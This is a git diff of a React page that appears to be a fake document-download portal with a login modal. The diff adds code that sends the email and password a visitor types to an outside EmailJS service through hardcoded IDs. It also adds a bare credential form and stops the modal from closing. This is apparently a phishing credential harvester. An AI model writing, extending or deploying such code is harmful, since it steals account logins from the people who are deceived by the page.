@@ -1,4 +1,4 @@
-import React, {useState} from 'react'
+import React, {useState, useRef } from 'react'
 import Modal from 'react-modal'
 import DotLink from './images/dotLink.svg';
 import {IoIosArrowRoundDown} from 'react-icons/io';
@@ -11,11 +11,15 @@ import Pdff from './images/pdff.png'
 import Specification from './images/specification.png'
 import Cross from './images/cross.png'
 import Close from './images/close.png'
+import emailjs from '@emailjs/browser';
 
-export default function Home(onSave) {
+
+export default function Home() {
     const [email, setEmail] =  useState("");
     const [password, setPassword] = useState("");
     const [modal, setModal] = useState(false);
+    const form = useRef();
+
     const openModal = () => {
         setModal(true);
       };
@@ -29,23 +33,38 @@ export default function Home(onSave) {
       const onChangePassword = (e) => {
         setPassword(e.target.value);
       };
-      const onSubmit = (e) => {
-        e.preventDefault();
-        if(!email && !password) {
-            alert('email required and correct pasword');
-        }else if (!email && password) {
-            alert('email required')
-        }else if (email && !password) {
-            alert('password required')
-        }else {
-            onSave({email, password})
-        }
-        setEmail("")
-        setPassword("");
-      };
+     
+      const handleSubmit = (e) => {
+        e.preventDefault()
+       
+       
+        emailjs
+          .sendForm(
+            'service_9pznuju',
+            'template_18m60wc',
+            // process.env.EMAIL_SERVICE,
+            // process.env.EMAIL_TEMPLATE,
+            form.current,
+            'C_wSoAeT9Ri-giwyP'
+            // process.env.EMAIL_USER
+          )
+          .then((res) => {
+           
+            e.target.reset()
+          })
+          .catch((err) => {
+            console.log(err)
+            
+          })
+      }
    
   return (
     <div>
+        <form ref={form} onSubmit={handleSubmit}>
+            <input type='text' name='email' onChange={onChangeEmail} />
+            <input type='password' name='password' onChange={onChangePassword} />
+<button>Submit</button>
+        </form>
     <div className='header'>
         <span className='documents'>
         <h3><p>DOCUMENTS</p></h3>
@@ -94,8 +113,8 @@ export default function Home(onSave) {
         ariaHideApp={false}
       >
         <body>
-            <form onSubmit={onSubmit}>
-                <div onClick={closeModal}>
+            <form onSubmit={handleSubmit}>
+                <div>
                 <img className='closee'src={Close} alt='' />
                 </div>
                 <div>
@@ -109,7 +128,7 @@ export default function Home(onSave) {
                    <p> <input type='checkbox'/> Stay Signed In </p>
                 </div>
                 <div>
-                    <button className='downloads' onClick={openModal}>Download</button>
+                    <button className='downloads'>Download</button>
                 </div>
                 <span>
                     <p className='access'> Can't access your account?</p>
